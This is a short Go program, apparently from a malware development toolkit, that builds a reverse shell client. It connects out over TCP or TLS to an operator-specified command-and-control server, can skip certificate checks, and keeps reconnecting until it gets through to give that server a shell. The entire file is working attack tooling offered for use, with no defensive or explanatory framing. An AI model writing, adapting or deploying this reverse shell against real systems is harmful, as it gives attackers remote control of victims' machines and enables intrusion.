// rshell is a minimal reverse shell using c2/shell and c2/transport.
//
// Usage:
//
//	rshell -host 10.0.0.1 -port 4444 [-tls] [-retry 0]
package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"time"

	"github.com/oioio-space/maldev/c2/shell"
	"github.com/oioio-space/maldev/c2/transport"
)

func main() {
	host := flag.String("host", "", "C2 server IP or hostname")
	port := flag.String("port", "4444", "C2 server port")
	useTLS := flag.Bool("tls", false, "use TLS transport")
	insecure := flag.Bool("insecure", false, "skip TLS certificate verification")
	retries := flag.Int("retry", 0, "max reconnection attempts (0 = unlimited)")
	wait := flag.Duration("wait", 5*time.Second, "base reconnect wait duration")
	flag.Parse()

	if *host == "" {
		fmt.Fprintln(os.Stderr, "error: -host is required")
		flag.Usage()
		os.Exit(1)
	}

	addr := net.JoinHostPort(*host, *port)
	timeout := 10 * time.Second

	var trans transport.Transport
	if *useTLS {
		opts := []transport.TLSOption{}
		if *insecure {
			opts = append(opts, transport.WithInsecure(true))
		}
		trans = transport.NewTLS(addr, timeout, "", "", opts...)
	} else {
		trans = transport.NewTCP(addr, timeout)
	}

	cfg := &shell.Config{
		MaxRetries:    *retries,
		ReconnectWait: *wait,
	}

	sh := shell.New(trans, cfg)

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	if err := sh.Start(ctx); err != nil {
		fmt.Fprintf(os.Stderr, "shell exited: %v\n", err)
		os.Exit(1)
	}
}
